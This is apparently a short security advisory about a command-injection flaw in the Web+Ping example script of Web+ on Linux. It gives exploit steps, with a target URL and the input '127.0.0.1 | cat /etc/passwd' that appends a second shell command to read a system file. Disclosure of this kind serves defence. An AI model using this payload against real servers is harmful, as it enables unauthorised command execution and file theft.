Web+ is a development language for use in creating web-based client/server applications.

In Linux versions of the product, an example script installed in Web+ (Web+Ping) which fails to correctly filter shell meta characters. As a result, parameters passed to this script may contain malicious shell commands, allowing an attacker to remotely execute or read any file which is accessible by the Web+ user.

Windows NT versions of Web+ are apparently not vulnerable.

To exploit simply place a '|' after the parameter you which to provide to
ping and then the command you wish to execute.

e.g:
Goto:
http://target/cgi-bin/webplus.cgi?Script=/webplus/webping/webping.wml

Then type in host destination box:
127.0.0.1 | cat /etc/passwd

You will then be presented with the contents of the /etc/passwd file.
